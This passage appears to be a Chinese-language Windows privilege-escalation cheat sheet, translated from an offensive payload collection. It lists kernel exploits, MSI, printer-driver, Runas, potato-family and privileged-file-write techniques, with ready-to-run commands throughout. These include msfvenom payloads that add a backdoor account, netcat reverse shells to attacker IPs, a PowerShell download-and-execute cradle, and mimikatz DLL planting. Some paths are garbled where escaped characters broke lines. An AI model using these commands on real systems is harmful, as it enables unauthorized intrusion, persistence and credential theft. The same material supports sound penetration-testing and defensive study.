- [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111) 　[KB3186973]　　[内核api]　　(Windows 10 10586 (32/64)/8.1)
- [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098) 　[KB3178466]　　[内核驱动程序]　　(Win 8.1)
- [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075) 　[KB3164038]　　[热土豆]　　(2003/2008/7/8/2012)
- [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034) 　[KB3143145]　　[内核驱动程序]　　(2008/7/8/10/2012)
- [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032) 　[KB3143141]　　[次登录句柄]　　(2008/7/8/10/2012)
- [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016) 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
- [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014) 　[K3134228]　　[远程代码执行]　　(2008/Vista/7)    
  ...
- [MS03-026](./MS03-026) 　[KB823980]　　 [RPC接口缓冲区溢出]　　(/NT/2000/XP/2003)  

要从Kali交叉编译程序，请使用以下命令。

```powershell
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

## EoP - 微软Windows安装程序

### AlwaysInstallElevated

使用`reg query`命令，您可以检查用户和计算机的`AlwaysInstallElevated`注册表项的状态。如果两次查询都返回`0x1`的值，则表示为用户和计算机启用了`AlwaysInstallElevated`，表明系统易受攻击。

* Shell命令

  ```powershell
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```

* PowerShell命令

  ```powershell
  Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
  Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
  ```

然后创建一个MSI包并安装它。

```powershell
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi
```

技术也可用于：

* Metasploit : `exploit/windows/local/always_install_elevated`
* PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`

### 自定义操作

> MSI中的自定义操作允许开发人员在安装过程中的各个点指定要运行的脚本或可执行文件

* [mgeeky/msidump](https://github.com/mgeeky/msidump) - 一个分析恶意MSI安装包、提取文件、流、二进制数据并集成YARA扫描器的工具。
* [activescott/lessmsi](https://github.com/activescott/lessmsi) - 一个查看和提取Windows安装程序(.msi)文件内容的工具。
* [mandiant/msi-search](https://github.com/mandiant/msi-search) - 该工具简化了红队操作员和安全团队识别哪些MSI文件对应哪些软件的任务，使他们能够下载相关文件。

枚举机器上的产品

```ps1
wmic product get identifyingnumber,name,vendor,version
```

使用`/fa`参数执行修复过程以触发CustomActions。我们可以使用IdentifyingNumber `{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}`或安装程序的路径`c:\windows\installer\XXXXXXX.msi`。修复将以NT SYSTEM账户运行。

```ps1
$installed = Get-WmiObject Win32_Product
$string= $installed | select-string -pattern "PRODUCTNAME"
$string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
```

MSI安装程序中的常见错误：

* 缺少安静参数：它将生成`conhost.exe`作为`NT SYSTEM`。使用`[CTRL]+[A]`选择其中的某些文本，它将暂停执行。
  * conhost -> 属性 -> "遗留控制台模式" 链接 -> Internet Explorer -> CTRL+O –> cmd.exe
* 直接操作的GUI：打开一个URL并启动浏览器，然后使用相同的场景。
* 从用户可写路径加载的二进制文件/脚本：您可能需要赢得竞态条件。
* DLL劫持/搜索顺序滥用
* 缺少PowerShell `-NoProfile`：将自定义命令添加到您的配置文件中

```ps1
new-item -Path $PROFILE -Type file -Force
echo "Start-Process -FilePath cmd.exe -Wait;" > $PROFILE
```

## EoP - 不安全的GUI应用程序

作为SYSTEM运行的应用程序，允许用户生成CMD或浏览目录。

示例："Windows帮助和支持"（Windows + F1），搜索"命令提示符"，点击"点击打开命令提示符"

## EoP - 评估易受攻击的驱动程序

查找加载的易受攻击的驱动程序，我们通常没有花足够的时间来查看这个：

* [Living Off The Land Drivers](https://www.loldrivers.io/) 是一个精选的Windows驱动程序列表，被敌手用来绕过安全控制并进行攻击。该项目帮助安全专业人士保持了解并减轻潜在威胁。

* 本机二进制文件：DriverQuery.exe

  ```powershell
  PS C:\Users\Swissky> driverquery.exe /fo table /si
  模块名称  显示名称           驱动类型   链接日期
  ============ ====================== ============= ======================
  1394ohci     1394 OHCI兼容主机控制器内核        12/10/2006 4:44:38 PM
  3ware        3ware                  内核        5/18/2015 6:28:03 PM
  ACPI         微软ACPI驱动程序  内核        12/9/1975 6:17:08 AM
  AcpiDev      ACPI设备驱动程序    内核        12/7/1993 6:22:19 AM
  acpiex       微软ACPIEx驱动程序内核        3/1/2087 8:53:50 AM
  acpipagr     ACPI处理器聚合内核        1/24/2081 8:36:36 AM
  AcpiPmi      ACPI功率表驱动程序内核        11/19/2006 9:20:15 PM
  acpitime     ACPI唤醒警报驱动程序内核        2/9/1974 7:10:30 AM
  ADP80XX      ADP80XX                内核        4/9/2015 4:49:48 PM
  <SNIP>
  ```

* [matterpreter/OffensiveCSharp/DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)

  ```powershell
  PS C:\Users\Swissky> DriverQuery.exe --no-msft
  [+] 枚举驱动服务...
  [+] 检查文件签名...
  Citrix USB过滤驱动程序
      服务名称：ctxusbm
      路径：C:\Windows\system32\DRIVERS\ctxusbm.sys
      版本：14.11.0.138
      创建时间（UTC）：2018年5月17日 01:20:50
      证书颁发者：CN=赛门铁克类3 SHA256代码签名CA，OU=赛门铁克信任网络，O=赛门铁克公司，C=US
      签名者：CN="Citrix Systems, Inc."，OU=XenApp(ClientSHA256)，O="Citrix Systems, Inc."，L=劳德代尔堡，S=佛罗里达州，C=US
  <SNIP>
  ```

## EoP - 打印机

### 通用打印机

创建打印机

```ps1
$printerName     = '通用特权打印机'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
 
Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
 
Add-PrinterDriver -Name       '通用 / 纯文本'
Add-Printer       -DriverName '通用 / 纯文本' -Name $printerName -PortName 'FILE:' -Shared
 
New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```

执行驱动程序

```ps1
$serverName  = 'dc.purple.lab'
$printerName = '通用特权打印机'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```

### PrinterNightmare

```ps1
git clone https://github.com/Flangvik/DeployPrinterNightmare
PS C:\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
[<3] @Flangvik - TrustedSec
[+] 复制 C:\Windows\system32\mscms.dll 到 C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
[+] 复制 64mimispool.dll 到 C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] 复制 32mimispool.dll 到 C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] 添加打印机驱动程序 => 通用 / 纯文本！
[+] 添加打印机 => EasySystemShell！
[+] 设置64位注册表键
[+] 设置32位注册表键
[+] 设置'*'注册表键
```

```ps1
PS C:\target> $serverName  = 'printer-installed-host'
PS C:\target> $printerName = 'EasySystemShell'
PS C:\target> $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
PS C:\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
PS C:\target> Add-Printer -ConnectionName $fullprinterName
```

### 自带漏洞

隐蔽位置：https://github.com/jacob-baines/concealed_position

* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark通用打印驱动程序LPE
* RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150打印驱动程序LPE
* POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6打印驱动程序LPE
* SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows打印后台处理程序LPE

```powershell
cp_server.exe -e ACIDDAMAGE
# Get-Printer
# 设置"高级共享设置" -> "关闭密码保护共享"
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
cp_client.exe -l -e ACIDDAMAGE
```

## EoP - Runas

使用`cmdkey`列出机器上存储的凭据。

```powershell
cmdkey /list
当前存储的凭据：
 目标：Domain:interactive=WORKGROUP\Administrator
 类型：域密码
 用户：WORKGROUP\Administrator
```

然后您可以使用`runas`和`/savecred`选项来使用保存的凭据。
以下示例是通过SMB共享调用远程二进制文件。

```powershell
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

使用提供的凭据集运行`runas`。

```powershell
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public
c.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

```powershell
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public
c.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

## EoP - 滥用卷影副本

如果您在机器上有本地管理员访问权限，请尝试列出卷影副本，这是进行权限提升的一种简单方法。

```powershell
# 使用vssadmin列出卷影副本（需要管理员访问权限）
vssadmin list shadows
  
# 使用diskshadow列出所有卷影副本
diskshadow list shadows all
  
# 创建指向卷影副本的符号链接并访问它
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

## EoP - 从本地管理员到NT SYSTEM

```powershell
PsExec.exe -i -s cmd.exe
```

## EoP - 生活在地表之下的二进制文件和脚本

生活在地表之下的二进制文件、脚本（以及库）：https://lolbas-project.github.io/

> LOLBAS项目的目标是记录每一个可用于生活在地表之下技术的二进制文件、脚本和库。

LOLBin/Lib/Script必须：

* 是微软签名的文件，无论是操作系统自带的还是从微软下载的。
  具有额外的"意外"功能。记录预期用例并不有趣。
  例外情况是应用程序白名单绕过
* 具有对APT或红队有用的功能

```powershell
wmic.exe process call create calc
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
Microsoft.Workflow.Compiler.exe tests.xml results.xml
```

## EoP - 伪装权限

完整权限备忘录位于 https://github.com/gtworek/Priv2Admin，下面的总结仅列出直接利用该权限获取管理员会话或读取敏感文件的方法。

| 权限                   | 影响         | 工具           | 执行路径                                                     | 备注                                                         |
| ---------------------- | ------------ | -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `SeAssignPrimaryToken` | ***管理员*** | 第三方工具     | *"允许用户使用诸如potato.exe、rottenpotato.exe和juicypotato.exe等工具伪造令牌和提升权限到nt系统"* | 感谢[Aurélien Chalot](https://twitter.com/Defte_)的更新。我会尽快尝试将其重新表述得更像食谱。 |
| `SeBackup`             | **威胁**     | ***内置命令*** | 使用`robocopy /b`读取敏感文件                                | - 如果能读取%WINDIR%\MEMORY.DMP则更有趣<br><br>- 当涉及到打开的文件时，`SeBackupPrivilege`（和robocopy）并不有用。<br><br>- Robocopy需要SeBackup和SeRestore才能使用/b参数工作。 |
| `SeCreateToken`        | ***管理员*** | 第三方工具     | 使用`NtCreateToken`创建包括本地管理员权限的任意令牌。        |                                                              |
| `SeDebug`              | ***管理员*** | **PowerShell** | 复制`lsass.exe`令牌。                                        | 可在[FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)找到脚本 |
| `SeLoadDriver`         | ***管理员*** | 第三方工具     | 1. 加载有漏洞的内核驱动程序，如`szkg64.sys`或`capcom.sys`<br>2. 利用驱动程序漏洞<br><br>或者，该权限可用于使用`ftlMC`内置命令卸载与安全相关的驱动程序。例如：`fltMC sysmondrv` | 1. `szkg64`漏洞被列为[CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. `szkg64` [漏洞代码](https://www.greyhathacker.net/?p=1025)由[Parvez Anwar](https://twitter.com/parvezghh)创建 |
| `SeRestore`            | ***管理员*** | **PowerShell** | 1. 以SeRestore权限启动PowerShell/ISE。<br>2. 使用[Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1))启用权限。<br>3. 将utilman.exe重命名为utilman.old<br>4. 将cmd.exe重命名为utilman.exe<br>5. 锁定控制台并按Win+U | 攻击可能被某些AV软件检测到。<br><br>另一种方法依赖于使用相同权限替换存储在"Program Files"中的服务二进制文件。 |
| `SeTakeOwnership`      | ***管理员*** | ***内置命令*** | 1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. 将cmd.exe重命名为utilman.exe4. 锁定控制台并按Win+U | 攻击可能被某些AV软件检测到。另一种方法依赖于使用相同权限替换存储在"Program Files"中的服务二进制文件。 |
| `SeTcb`                | ***管理员*** | 第三方工具     | 操纵令牌以包含本地管理员权限。可能需要SeImpersonate。        | 待验证。                                                     |

### 恢复服务账户的权限

> 该工具应仅以LOCAL SERVICE或NETWORK SERVICE身份执行。



```powershell
# https://github.com/itm4n/FullPowers

c:\TOOLS>FullPowers
[+] Started dummy thread with id 9976
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19041.84]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```

### Meterpreter getsystem及其替代方案

```powershell
meterpreter> getsystem 
Tokenvator.exe getsystem cmd.exe 
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
psexec -s -i cmd.exe 
python getsystem.py # 来自 https://github.com/sailay1996/tokenx_privEsc
```

### RottenPotato（令牌模仿）

* 可在此处获取二进制文件：[foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato) 和 [breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

* 使用加载了`incognito模式`的Metasploit进行利用。

  ```c
  getuid
  getprivs
  use incognito
  list_tokens -u
  cd c:\temp\
  execute -Hc -f ./rot.exe
  impersonate_token "NT AUTHORITY\SYSTEM"
  ```

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

### Juicy Potato（滥用黄金权限）

> 如果机器是 **>= Windows 10 1809 & Windows Server 2019** - 尝试 **Rogue Potato**    
> 如果机器是 **< Windows 10 1809 < Windows Server 2019** - 尝试 **Juicy Potato**

* 可在此处获取二进制文件：[ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/releases) 

1. 检查服务帐户的权限，您应该寻找 **SeImpersonate** 和/或 **SeAssignPrimaryToken**（在身份验证后模仿客户端）

   ```powershell
   whoami /priv
   ```

2. 根据您的Windows版本选择一个CLSID，CLSID是一个全局唯一标识符，用于标识COM类对象

   * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
   * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
   * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
   * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
   * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
   * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
   * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 

3. 执行JuicyPotato以运行特权命令。

   ```powershell
   JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload
   c.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
   JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
   JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
       测试 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
       ......
       [+] authresult 0
       {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
       [+] CreateProcessWithTokenW OK
   ```

### Rogue Potato（假冒OXID解析器）

* 可在此处获取二进制文件：[antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

```powershell
# 网络重定向器/端口转发器，在远程计算机上运行，必须使用135作为源端口
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

# 不在本地运行RogueOxidResolver的RoguePotato。您应该在远程计算机上运行RogueOxidResolver.exe。
# 如果有防火墙限制，请使用此选项。
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"

# RoguePotato全能版，本地在9999端口运行RogueOxidResolver
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999

# RoguePotato全能版，本地在9999端口运行RogueOxidResolver，并指定特定的clsid和自定义pipename
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```

### EFSPotato（MS-EFSR EfsRpcOpenFileRaw）

* 可在此处获取二进制文件：https://github.com/zcgonvh/EfsPotato

```powershell
# .NET 4.x
csc EfsPotato.cs
csc /platform:x86 EfsPotato.cs

# .NET 2.0/3.5
C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
```

### JuicyPotatoNG

* [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

```powershell
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
```

###  PrintSpoofer（打印机漏洞）

> 如果启用了SeImpersonatePrivilege，此方法有效

* 可在此处获取二进制文件：https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

```powershell
# 运行 nc -lnvp 443 然后：
.\PrintSpoofer64.exe -c "C:\Temp
c64.exe 192.168.45.171 443 -e cmd"
# 不使用监听器
.\PrintSpoofer64.exe -i -c cmd
# 通过RPD
.\PrintSpoofer64.exe -d 3 -c "powershell -ep bypass"
```

## EoP - 特权文件写入

### DiagHub

:warning: 从1903版本开始，DiagHub不能再用来加载任意DLL。

微软诊断中心标准收集服务（DiagHub）是一个收集跟踪信息的服务，通过DCOM程序化地暴露。
这个DCOM对象可以用来将DLL加载到SYSTEM进程中，前提是此DLL存在于`C:\Windows\System32`目录中。

#### 利用方法

1. 创建一个[恶意DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0)，例如：payload.dll并将其移动到`C:\Windows\System32`
2. 构建 https://github.com/xct/diaghub
3. `diaghub.exe c:\\ProgramData\\ payload.dll`

默认有效载荷将运行`C:\Windows\System32\spool\drivers\color
c.exe -lvp 2000 -e cmd.exe`

替代工具：

* https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag
* https://github.com/decoder-it/diaghub_exploit

### UsoDLLLoader

:warning: 2020-06-06更新：此技巧在最新版本的Windows 10预览版中不再有效。

> 由James Forshaw（又名@tiraniddo）发现的DiagHub DLL加载“漏洞”的替代方法

如果我们在Windows或某些第三方软件中发现了一个特权文件写入漏洞，我们可以将自己的`windowscoredeviceinfo.dll`复制到`C:\Windows\Sytem32\`，然后通过USO服务加载它，以获得**NT AUTHORITY\System**的任意代码执行权限。

#### 利用方法

1. 构建 https://github.com/itm4n/UsoDllLoader
   * 选择Release配置和x64架构。
   * 构建解决方案。
     * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
     * 加载器 .\x64\Release\UsoDllLoader.exe.
2. 将`WindowsCoreDeviceInfo.dll`复制到`C:\Windows\System32\`
3. 使用加载器等待shell出现或运行`usoclient StartInteractiveScan`并连接到1337端口的绑定shell。

### WerTrigger

> 利用Windows问题报告的特权文件写入漏洞

1. 克隆 https://github.com/sailay1996/WerTrigger
2. 将`phoneinfo.dll`复制到`C:\Windows\System32\`
3. 将`Report.wer`文件和`WerTrigger.exe`放在同一目录下。
4. 然后，运行`WerTrigger.exe`。
5. 享受作为**NT AUTHORITY\SYSTEM**的shell

### WerMgr

> 利用Windows错误报告的特权目录创建漏洞

1. 克隆 https://github.com/binderlabs/DirCreate2System
2. 创建目录`C:\Windows\System32\wermgr.exe.local\`
3. 授权访问它：`cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f`
4. 将`spawn.dll`文件和`dircreate2system.exe`放在同一目录下并运行`.\dircreate2system.exe`。 
5. 享受作为**NT AUTHORITY\SYSTEM**的shell

## EoP - 特权文件删除

在 MSI 安装过程中，Windows Installer 服务会记录每一次更改，以防需要回滚，为此它会创建：

* 在 `C:\Config.Msi` 文件夹中包含
  * 一个回滚脚本（`.rbs`）
  * 一个回滚文件（`.rbf`）

要将特权文件删除转换为本地权限提升，你需要滥用 Windows Installer 服务。

* 在 Windows Installer 创建受保护的 `C:\Config.Msi` 文件夹后立即删除它
* 使用弱 DACL 权限重新创建 `C:\Config.Msi` 文件夹，因为普通用户被允许在 `C:\` 的根目录下创建文件夹。
* 将恶意的 `.rbs` 和 `.rbf` 文件放入其中，以便由 MSI 回滚执行
* 然后在回滚时，Windows Installer 将对系统进行任意更改

触发此链条的最简单方法是使用 [thezdi/FilesystemEoPs/FolderOrFileDeleteToSystem](https://github.com/thezdi/PoC/tree/master/FilesystemEoPs/FolderOrFileDeleteToSystem)。
该利用包含一个 .msi 文件，有两个操作，第一个操作产生延迟，第二个操作用于引发错误以使其回滚。这个回滚将“恢复”位于 `C:\Program Files\Common Files\microsoft shared\ink\HID.dll` 的恶意 HID.dll。

然后使用 `[CTRL]+[ALT]+[DELETE]` 切换到安全桌面并打开屏幕键盘 (`osk.exe`)。
`osk.exe` 进程首先寻找 `C:\Program Files\Common Files\microsoft shared\ink\HID.dll` 库，而不是 `C:\Windows\System32\HID.dll`

## EoP - 常见漏洞和暴露

### MS08-067 (NetAPI)

使用以下 nmap 脚本来检查漏洞。

```c
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>
```

利用 `MS08-067 NetAPI` 的 Metasploit 模块。

```powershell
exploit/windows/smb/ms08_067_netapi
```

如果你不能使用 Metasploit 并且只想获取一个反向 shell。

```powershell
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows

示例：MS08_067_2018.py 192.168.1.1 1 445 - 适用于 Windows XP SP0/SP1 通用版，端口 445
示例：MS08_067_2018.py 192.168.1.1 2 139 - 适用于 Windows 2000 通用版，端口 139（也可以使用 445）
示例：MS08_067_2018.py 192.168.1.1 3 445 - 适用于 Windows 2003 SP0 通用版
示例：MS08_067_2018.py 192.168.1.1 4 445 - 适用于 Windows 2003 SP1 英文版
示例：MS08_067_2018.py 192.168.1.1 5 445 - 适用于 Windows XP SP3 法语版（NX）
示例：MS08_067_2018.py 192.168.1.1 6 445 - 适用于 Windows XP SP3 英文版（NX）
示例：MS08_067_2018.py 192.168.1.1 7 445 - 适用于 Windows XP SP3 英文版（AlwaysOn NX）
python ms08-067.py 10.0.0.1 6 445
```

### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7

'KiTrap0D' 用户模式到环提升（MS10-015）

```powershell
https://www.exploit-db.com/exploits/11199

Metasploit : exploit/windows/local/ms10_015_kitrap0d
```

### MS11-080 (afd.sys) - Microsoft Windows XP/2003

```powershell
Python: https://www.exploit-db.com/exploits/18176
Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
```

### MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012

```powershell
printf("[#] usage: ms15-051 command 
");
printf("[#] eg: ms15-051 \"whoami /all\" 
");

# x32
https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe

# x64
https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
use exploit/windows/local/ms15_051_client_copy_image
```

### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)

检查补丁是否安装：`wmic qfe list | findstr "3139914"`

```powershell
Powershell:
https://www.exploit-db.com/exploits/39719/
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```



### MS17-010（永恒之蓝）

使用以下nmap脚本或crackmapexec检查漏洞：`crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010`。

```c
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
```

利用`EternalRomance/EternalSynergy/EternalChampion`的Metasploit模块。

```powershell
auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB远程Windows命令执行
auxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE检测
exploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB远程Windows内核池损坏
exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB远程Windows内核池损坏，适用于Win8+
